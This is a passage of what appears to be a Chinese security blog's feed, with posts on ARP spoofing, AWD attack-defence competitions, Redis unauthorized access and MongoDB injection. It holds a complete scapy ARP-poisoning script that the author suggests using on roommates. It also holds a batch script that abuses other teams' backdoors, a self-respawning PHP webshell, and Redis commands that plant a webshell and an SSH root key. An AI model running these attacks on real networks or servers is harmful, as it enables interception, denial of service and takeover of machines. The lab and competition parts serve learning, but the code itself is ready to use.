class="line">    ])</span><br><span class="line">print(<span class="string">&#x27;----------------------------&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;&quot;</span>.join([d.data <span class="keyword">for</span> d <span class="keyword">in</span> data]))</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE2020-1938幽灵猫漏洞利用复现&quot;&gt;&lt;a href=&quot;#CVE2020-1938幽灵猫漏洞利用复现&quot; class=&quot;headerlink&quot; title=&quot;CVE2020-1938幽灵猫漏洞利用复现&quot;&gt;&lt;/a&gt;CVE2020-1938幽灵猫漏洞利用复现&lt;/h1&gt;</summary>
    
    
    
    <category term="vuln" scheme="http://example.com/categories/vuln/"/>
    
    
  </entry>
  
  <entry>
    <title>arp欺骗</title>
    <link href="http://example.com/2020/11/30/arp%E6%AC%BA%E9%AA%97/"/>
    <id>http://example.com/2020/11/30/arp%E6%AC%BA%E9%AA%97/</id>
    <published>2020-11-30T09:40:37.000Z</published>
    <updated>2021-01-13T08:37:34.204Z</updated>
    
    <content type="html"><![CDATA[<h1 id="同局域网下arp欺骗攻击"><a href="#同局域网下arp欺骗攻击" class="headerlink" title="同局域网下arp欺骗攻击"></a>同局域网下arp欺骗攻击</h1><a id="more"></a><pre><code>试想一下这些场景，在寝室看学习或者睡觉的时候，室友疯狂吵闹，这个时候是不是很想断了他们的网。或者在夜深人静的时候，室友躲在被窝里，看着某些不可描述的场景，嘿嘿嘿的时候哦，是不是很想截取到他们的资源，这个时候处于同一局域网下的你，正好可以利用arp不验证用户身份的特性，进行arp欺骗</code></pre><hr><h3 id="arp的原理"><a href="#arp的原理" class="headerlink" title="arp的原理"></a>arp的原理</h3><p>地址解析协议，即ARP(Address Resolution Protocol)，是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上所有主机，并接收返回消息，以此确定目标的物理地址;收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。简单来说就是当你向局域网某台主机发送请求的时候，你的机器只知道请求主机的ip不知道其mac地址，这个时候就需要通过arp协议向局域网发送广播的arp数据包，然后局域网中根据其ip进行应答，返回rarp数据包给请求的pc，但是arp协议并不校验身份信息，于是就产生了安全问题</p><h3 id="arp的攻击方式"><a href="#arp的攻击方式" class="headerlink" title="arp的攻击方式"></a>arp的攻击方式</h3><ol><li>最常见的攻击方式-断网攻击，攻击者向受害者机器发送arp包，假设网关的ip为1.1.1.1，受害者机器ip为5.5.5.5，攻击机向受害者发送arp包，将受害者机器的arp表中的网关指向2.2.2.2使其数据无法经过网关转发出去，造成无法访问外网</li><li>arp截取攻击，攻击者向受害者主机发送arp包，更新受害者的arp表，将网关地址改成攻击机地址，用于接收受害者发送的数据，可以通过此法获取各种帐号密码</li><li>欺骗网关，向网关发送arp包，将网关的arp更新，把受害者5.5.5.5的主机的mac更换成攻击机的mac地址，使得受害者无法接收网关转发给自己的数据<h3 id="arp攻击演示"><a href="#arp攻击演示" class="headerlink" title="arp攻击演示"></a>arp攻击演示</h3>实验环境:<br>虚拟机kali linux(不限，攻击机),物理主机windows10(受害者机器),将虚拟机和物理主机设置成同一网段下,虚拟机使用桥接模式<br><img src="/image/ip01.png" alt="ip1"><br><img src="/image/ip02.png" alt="ip"></li></ol><hr><p>上脚本进行断网攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># _*_ coding=utf-8 _*_  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> (</span><br><span class="line">    get_if_hwaddr,  <span class="comment"># 获取本机的网络接口</span></span><br><span class="line">    getmacbyip,  <span class="comment"># 通过MAC换取IP</span></span><br><span class="line">    ARP,  <span class="comment"># ARP数据包构建</span></span><br><span class="line">    Ether,  <span class="comment"># 以太网数据包构建</span></span><br><span class="line">    sendp  <span class="comment"># 在第二层发送数据包</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser  <span class="comment"># 处理命令行参数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>                                                                                                                                                                                                                                </span><br><span class="line">    <span class="keyword">try</span>:                                                                                                                                                                                                                                   </span><br><span class="line">        <span class="keyword">if</span> os.getuid() != <span class="number">0</span>:                                                                                                                                                                                                               </span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;[-]Run me as root&quot;</span>                                                                                                                                                                                                      </span><br><span class="line">            sys.exit(<span class="number">1</span>)                                                                                                                                                                                                                    </span><br><span class="line">    <span class="keyword">except</span> BaseException:  <span class="comment"># 捕获所有的异常                                                                                                                                                                                                </span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Something  Error&#x27;</span>  <span class="comment"># try中的函数执行发生异常的话，就执行Something Error                                                                                                                                                     </span></span><br><span class="line">                                                                                                                                                                                                                                           </span><br><span class="line">    usage = <span class="string">&#x27;Usage:%prog [-i interface][-t target] host&#x27;</span>  <span class="comment"># 命令行参数相关                                                                                                                                                                 </span></span><br><span class="line">    parser = OptionParser(usage)                                                                                                                                                                                                           </span><br><span class="line">    parser.add_option(<span class="string">&#x27;-i&#x27;</span>, dest=<span class="string">&#x27;interface&#x27;</span>, help=<span class="string">&#x27;Specify the interface to use&#x27;</span>)                                                                                                                                                         </span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, dest=<span class="string">&#x27;target&#x27;</span>, help=<span class="string">&#x27;Specify a particular to ARP poison&#x27;</span>)                                                                                                                                                      </span><br><span class="line">    parser.add_option(<span class="string">&#x27;-m&#x27;</span>, dest=<span class="string">&#x27;mode&#x27;</span>, default=<span class="string">&#x27;req&#x27;</span>,</span><br><span class="line">                      help=<span class="string">&#x27;Posioning mode:requests(req) or replies(rep) [default:%default]&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-s&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, dest=<span class="string">&#x27;summary&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                      help=<span class="string">&#x27;Show packet summary and ask for confirmation before poisoning&#x27;</span>)  <span class="comment"># 内容被存入到summary中，比如</span></span><br><span class="line">    <span class="comment"># store</span></span><br><span class="line">    <span class="comment"># -s 10,则options.summary就等于10</span></span><br><span class="line">    <span class="comment"># store_true</span></span><br><span class="line">    <span class="comment"># -s,出现-s则options.summary就为True</span></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(args) != <span class="number">1</span> <span class="keyword">or</span> options.interface <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    mac = get_if_hwaddr(options.interface)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          以请求包的方式进行欺骗，目的是欺骗网关,让网关把所有的发给被害主机的数据给为本机发一份，同时被害主机毫无察觉。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        gateway_mac = getmacbyip(args[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> options <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 广播欺骗</span></span><br><span class="line">            pkt = Ether(src=mac, dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(hwsrc=mac, psrc=options.target, hwdst=gateway_mac,</span><br><span class="line">                                                                pdst=args[<span class="number">0</span>], op=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.target:  <span class="comment"># 定向欺骗</span></span><br><span class="line">            target_mac = getmacbyip(options.target)</span><br><span class="line">            <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span></span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">        pkt = Ether(src=mac, dst=gateway_mac) / ARP(hwsrc=mac, psrc=options.target, hwdst=gateway_mac, pdst=args[<span class="number">0</span>],</span><br><span class="line">                                                        op=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> pkt</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_rep</span>():</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         以回应包的形式，只是在欺骗被攻击的主机，网关的mac是我这台主机的mac。</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> options.target <span class="keyword">is</span> <span class="literal">None</span>:  <span class="comment"># 广播欺骗  骗所有人</span></span><br><span class="line">            pkt = Ether(src=mac, dst=<span class="string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span>) / ARP(hwsrc=mac, psrc=args[<span class="number">0</span>], op=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.target:  <span class="comment"># 广播欺骗  骗指定的人</span></span><br><span class="line">            target_mac = getmacbyip(options.target)</span><br><span class="line">            <span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;[-] Error: Could not resolve targets MAC address&quot;</span></span><br><span class="line">                sys.exit(<span class="number">1</span>)</span><br><span class="line">            pkt = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=args[<span class="number">0</span>], hwdst=target_mac, pdst=options.target,</span><br><span class="line">                                                       op=<span class="number">2</span>)</span><br><span class="line">            <span class="comment"># 本机mac 受欺骗的主机mac 本机mac 网关的ip地址 被攻击人的mac 被攻击人的ip OP值是表示请求还是回应 1：请求  2：回应</span></span><br><span class="line">            <span class="comment"># 从本机发往受欺骗主机， 内容是网关的mac是本机。</span></span><br><span class="line">        <span class="keyword">return</span> pkt</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.mode == <span class="string">&#x27;req&#x27;</span>:</span><br><span class="line">        pkt = build_req()</span><br><span class="line">    <span class="keyword">elif</span> options.mode == <span class="string">&#x27;rep&#x27;</span>:</span><br><span class="line">        pkt = build_rep()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.summary <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        pkt.show()</span><br><span class="line">        ans = raw_input(<span class="string">&#x27;\n[*] Continue? [Y|n]: &#x27;</span>).lower()</span><br><span class="line">        <span class="keyword">if</span> ans == <span class="string">&#x27;y&#x27;</span> <span class="keyword">or</span> len(ans) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sendp(pkt, inter=<span class="number">2</span>, iface=options.interface)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><hr><p>攻击方式: python2 arp_spoof.py -i eth0 -t ip -m rep -s 网关ip<br>演示截图:<br>没有开始攻击的时候能够正常上网:<br><img src="/image/exa.png" alt="演示"><br>进行攻击无法上网<br><img src="/image/exa2.png" alt="攻击"></p><hr><p>ps:因为学校能够访问到ip所以就打码隐藏了</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;同局域网下arp欺骗攻击&quot;&gt;&lt;a href=&quot;#同局域网下arp欺骗攻击&quot; class=&quot;headerlink&quot; title=&quot;同局域网下arp欺骗攻击&quot;&gt;&lt;/a&gt;同局域网下arp欺骗攻击&lt;/h1&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>awd入门篇</title>
    <link href="http://example.com/2020/11/19/awd%E5%85%A5%E9%97%A8%E7%AF%87/"/>
    <id>http://example.com/2020/11/19/awd%E5%85%A5%E9%97%A8%E7%AF%87/</id>
    <published>2020-11-19T09:14:53.000Z</published>
    <updated>2021-01-13T08:37:43.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="新手如何快速入门AWD"><a href="#新手如何快速入门AWD" class="headerlink" title="新手如何快速入门AWD"></a>新手如何快速入门AWD</h1><a id="more"></a><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本篇文章是给新手入门准备AWD比赛的文章，技术大佬请绕道</p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><h2 id="AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。-AWD-attack-with-defence"><a href="#AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。-AWD-attack-with-defence" class="headerlink" title="AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。 AWD attack with defence"></a>AWD赛制是一种网络安全竞赛的赛制。AWD赛制由安全竞赛专家及行业专家凭借十多年实战经验，将真实网络安全防护设备设施加入抽象的网络环境中，模拟政府、企业、院校等单位的典型网络结构和配置，开展的一种人人对抗的竞赛方式，考验参赛者攻防兼备的能力。其主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。 AWD attack with defence</h2><h3 id="赛前需要掌握的技能和工具"><a href="#赛前需要掌握的技能和工具" class="headerlink" title="赛前需要掌握的技能和工具"></a>赛前需要掌握的技能和工具</h3><p>扫描工具(必备): D盾,seay源代码审计系统<br>终端模拟器:xshell<br>虚拟机:kali linux<br>shell管理:蚁剑，中国菜刀，冰蝎（可任选其一ps:蚁剑只能接收post）</p><hr><h3 id="比赛开始之后要做什么"><a href="#比赛开始之后要做什么" class="headerlink" title="比赛开始之后要做什么"></a>比赛开始之后要做什么</h3><ol><li>拿到主办方给的账户利用xshell登录，如何使用xshell请自行搜索不再赘述</li><li>如果账户的密码是有规律可寻的，那么一定一定要修改自己的密码，登录之后passwd回车，输入两次密码后修改成功,密码有迹可循可以登录别人的机器然后直接查找到flag或者写入不死马，能够充分取分</li><li>将/var/www/html(一般来说web源码都在这个文件夹下)下的源码下载到本地，这个时候不能闲着，快速浏览web服务的各个目录找到后门，一般很容易辨识，如door.php,shell.php,webshell.php,hack.php….</li><li>cat /door.php 使用蚁剑或者菜刀连接别人的web服务找到flag快速取分同时删掉后门文件防止失分</li><li>写批量利用的py脚本对后门进行攻击,如:ip/door.php 后门密码为post型的door<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#假设参加的人数为30ip的最后一段为1-30</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">    url=<span class="string">&#x27;192.168.x.&#123;&#125;/door.php&#x27;</span>.format(i)</span><br><span class="line">    data=&#123;<span class="string">&#x27;door&#x27;</span>:<span class="string">&#x27;cat /flag.txt&#x27;</span>&#125;</span><br><span class="line">    <span class="comment">#try except用于判断是否还有shell，如果没有则跳过</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        re = requests.post(url,data,timeout=<span class="number">3</span>)</span><br><span class="line">        print(re.content)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            这里可以添加自动向裁判提交flag的内容，参考上面的post</span></span><br><span class="line"><span class="string">            data2=&#123;&#x27;flag&#x27;:re.content&#125;</span></span><br><span class="line"><span class="string">            re = requests.post(url2,data2)url2为向裁判提交的url</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">PS:有的比赛得分并不是提交flag而是拿到shell之后进行curl+token攻击，这一定要看好主办方是怎么说的</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></li><li>快速得分之后就是进行代码审计了可以使用seay自动审计列出可能存在风险的文件，进行代码审计</li><li>如果审计不出什么东西，记得时刻关注积分板，如果自己被攻击了，可以获取别人的payload进行攻击apache的日志一般在 /usr/local/apache/logs，也可以实时用wireshark抓取本地的流量查看payload，wireshark搜索敏感关键字eval assert post get</li><li>获取别人的shell之后上传不死马<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常见不死马</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="number">1</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="string">&#x27;.config.php&#x27;</span>, <span class="string">&#x27;@eval($_POST[&#x27;</span>hack<span class="string">&#x27;]);?&gt;&#x27;</span>);</span><br><span class="line">        system(<span class="string">&#x27;chmod 777 .config.php&#x27;</span>); </span><br><span class="line">        touch(<span class="string">&quot;.config.php&quot;</span>, mktime(<span class="number">20</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">17</span>,<span class="number">2017</span>)); </span><br><span class="line">    usleep(<span class="number">100</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//hack密码蚁剑直连</span></span><br></pre></td></tr></table></figure><h3 id="训练大纲"><a href="#训练大纲" class="headerlink" title="训练大纲"></a>训练大纲</h3></li><li>linux常见命令的使用kill ps grep rm mkdir等</li><li>D盾扫描工具和seay扫描工具的使用</li><li>shell管理的使用</li><li>xshell,x-ftp的使用</li><li>搜集php的一句话木马以及不死马</li><li>掌握基本的php代码审计能力可以练习简单的ctfphp代码审计题</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;新手如何快速入门AWD&quot;&gt;&lt;a href=&quot;#新手如何快速入门AWD&quot; class=&quot;headerlink&quot; title=&quot;新手如何快速入门AWD&quot;&gt;&lt;/a&gt;新手如何快速入门AWD&lt;/h1&gt;</summary>
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
    <category term="awd" scheme="http://example.com/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权漏洞</title>
    <link href="http://example.com/2020/11/15/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2020/11/15/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-11-15T08:33:48.000Z</published>
    <updated>2021-01-13T08:39:25.673Z</updated>
    
    <content type="html"><![CDATA[<h1 id="redis未授权访问漏洞"><a href="#redis未授权访问漏洞" class="headerlink" title="redis未授权访问漏洞"></a>redis未授权访问漏洞</h1><a id="more"></a><h3 id="未授权访问漏洞产生原因"><a href="#未授权访问漏洞产生原因" class="headerlink" title="未授权访问漏洞产生原因"></a>未授权访问漏洞产生原因</h3><pre><code>redis安装之后如果不进行相关安全操作，比如修改conf文件等时，能构造成redis不用经过登录就能够直接访问。</code></pre><p>redis一般绑定在0.0.0.0:6379上，如果没有设置防火墙规则，会直接暴露在公网上</p><h3 id="未授权访问漏洞的危害"><a href="#未授权访问漏洞的危害" class="headerlink" title="未授权访问漏洞的危害"></a>未授权访问漏洞的危害</h3><pre><code>一般来说redis的未授权访问是发生在内网的，经常会配合ssrf漏洞进行漏洞利用攻击1. 能够造成敏感信息泄露，恶意使用flushall来清空内部所有数据2. 攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；3. 如果没有在redis.conf将daemonize no改为yes 和protected-mode no改为yes的话就很容易造成写入.ssh公钥直接以root权限，直接以root权限控制整个服务器</code></pre><h3 id="redis攻击利用姿势"><a href="#redis攻击利用姿势" class="headerlink" title="redis攻击利用姿势"></a>redis攻击利用姿势</h3><pre><code>1. 直接通过未授权访问连接到服务器的redis    执行命令 redis-cli -h +ip 2. 开启web服务一般来说linux下的web服务的路径为/var/www/html/下    连接后</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;X&#x27;])?&gt;&quot;</span></span><br><span class="line">save</span><br><span class="line"><span class="comment">#接到提示为ok之后就能够利用蚁剑菜刀等连接shell</span></span><br></pre></td></tr></table></figure><pre><code>3. 存在ssh服务，直接本地生成ssh公钥写入/root/.ssh</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># ssh-keygen -t rsa</span></span><br></pre></td></tr></table></figure><p><img src="/image/bash.png" alt="演示"><br>之后进入/root/.ssh目录，将公钥保存到另一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment">#(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</span></span><br></pre></td></tr></table></figure><p>将公钥写入redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># cat 1.txt | redis-cli -h 10.10.10.135 -x set crack</span></span><br></pre></td></tr></table></figure><p>无误后连接redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@LAPTOP-60MTI4MA:~<span class="comment"># redis -cli -h +ip</span></span><br><span class="line">ip:6379&gt;config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">ip:6379&gt;config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">ip:6379&gt;save</span><br><span class="line">ip:6379&gt;<span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>最后ssh使用公钥以root连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh - i id_rsa root@ip</span><br></pre></td></tr></table></figure><p>后续接着写配合ssrf利用gopher协议打redis</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;redis未授权访问漏洞&quot;&gt;&lt;a href=&quot;#redis未授权访问漏洞&quot; class=&quot;headerlink&quot; title=&quot;redis未授权访问漏洞&quot;&gt;&lt;/a&gt;redis未授权访问漏洞&lt;/h1&gt;</summary>
    
    
    
    <category term="vuln" scheme="http://example.com/categories/vuln/"/>
    
    
    <category term="ssrf" scheme="http://example.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>mongodb注入</title>
    <link href="http://example.com/2020/10/22/mongodb%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2020/10/22/mongodb%E6%B3%A8%E5%85%A5/</id>
    <published>2020-10-22T08:16:48.000Z</published>
    <updated>2021-01-13T08:39:04.824Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于非关系型数据库mongodb的注入"><a href="#关于非关系型数据库mongodb的注入" class="headerlink" title="关于非关系型数据库mongodb的注入"></a>关于非关系型数据库mongodb的注入</h2><a id="more"></a><h4 id="首先看一下mangodb是怎么使用数据的"><a href="#首先看一下mangodb是怎么使用数据的" class="headerlink" title="首先看一下mangodb是怎么使用数据的"></a>首先看一下mangodb是怎么使用数据的</h4><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">增加数据:</span><br><span class="line">    db.table.save(&#123;&#x27;xxx&#x27;:1&#125;);</span><br><span class="line">查找数据:</span><br><span class="line">    db.table.find(&#123;&#x27;xxx&#x27;:1&#125;);</span><br><span class="line">删减数据:</span><br><span class="line">    db.table.remove(&#123;&#x27;xxx&#x27;:1&#125;);</span><br><span class="line">修改数据:</span><br><span class="line">    db.table.update(&#123;&#x27;xxx&#x27;:1&#125;,&#123;&#x27;xxx&#x27;,2&#125;);</span><br></pre></td></tr></table></figure><h4 id="上一道题目"><a href="#上一道题目" class="headerlink" title="上一道题目"></a>上一道题目</h4><p>源码:<br>    <img src="https://www.mozhe.cn/uploads/2018/07/04/1530693387a37838.jpg" alt="源码"><br>    <a href="https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe">题目地址</a></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span 